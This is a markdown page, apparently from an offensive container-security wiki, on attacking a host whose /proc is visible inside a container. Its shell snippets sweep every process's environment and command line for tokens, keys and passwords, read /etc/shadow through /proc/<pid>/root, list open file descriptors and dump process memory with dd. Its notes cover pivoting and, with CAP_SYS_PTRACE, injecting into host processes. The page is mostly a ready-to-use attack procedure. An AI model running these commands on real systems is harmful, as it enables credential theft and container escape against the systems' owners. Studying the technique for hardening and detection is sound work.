---
title: "Host process access: reading host memory and secrets through a mounted proc"
order: 6
description: "When the host's /proc is visible in a container, through a bind mount or a shared PID namespace, every host process is reachable. An attacker reads command lines and environment variables for secrets, follows /proc/pid/root into other containers' filesystems, and reads or writes /proc/pid/mem to extract keys or inject into a host process."
keywords:
  - host proc
  - proc pid mem
  - proc pid environ
  - pid namespace
  - container escape
---

# Host process access

`/proc` exposes the internals of every process the viewer can see. When a container sees the host's process table, either because the host `/proc` is bind-mounted or because the container shares the host PID namespace (`--pid=host`, `hostPID: true`), the whole host process list becomes readable. That turns `/proc` into a rich source of secrets and a path into other processes: command lines, environment variables, open file descriptors, the process root, and, with the right privileges, process memory.

Confirm host processes are visible:

```bash
ls /proc | grep -E '^[0-9]+$' | wc -l         # many PIDs, including low host ones
readlink /proc/1/exe                           # host init (systemd) => host proc/namespace
ps aux | head                                  # host processes listed
```

## Routes

```bash
# Secrets in environment and command lines (tokens, DB creds, API keys)
for p in /proc/[0-9]*; do tr '\0' '\n' < $p/environ 2>/dev/null; done | \
  grep -iE 'token|secret|key|pass' | sort -u
cat /proc/[0-9]*/cmdline 2>/dev/null | tr '\0' ' '

# Follow a host process root into its filesystem (e.g. another container)
ls -la /proc/<pid>/root/                        # the target process's "/" as it sees it
cat /proc/<pid>/root/etc/shadow 2>/dev/null

# Open file descriptors can expose sockets, logs, and secret files held open
ls -l /proc/<pid>/fd/

# Read process memory directly (needs ptrace permission / CAP_SYS_PTRACE)
grep -F 'rw-p' /proc/<pid>/maps                 # writable regions and their ranges
dd if=/proc/<pid>/mem bs=1 skip=$((0xADDR)) count=256 2>/dev/null | xxd
```

`/proc/<pid>/root` is especially useful: it is a symlink to that process's filesystem root, so if a host process or another container has files the attacker wants, they are reachable through this path without any mount of their own.

## Exploitation notes

- Reading `environ`, `cmdline`, and `fd` needs only visibility and usually the same or privileged UID; it is a pure information-disclosure step that frequently yields tokens that unlock the host or cluster directly.
- Reading or writing `/proc/<pid>/mem` for a process you do not own requires ptrace permission, so pair this with [CAP_SYS_PTRACE](../../privileged-configuration/capability-abuse/cap-sys-ptrace.md) for injection; without it, the memory routes are limited to your own processes.
- A shared PID namespace alone (without extra capabilities) still exposes other processes' `environ` and `root` when UIDs match, which is often enough to pivot.

## References

- [man 5 proc](https://man7.org/linux/man-pages/man5/proc.5.html)
- [HackTricks: hostPID and proc access](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/namespaces/pid-namespace)
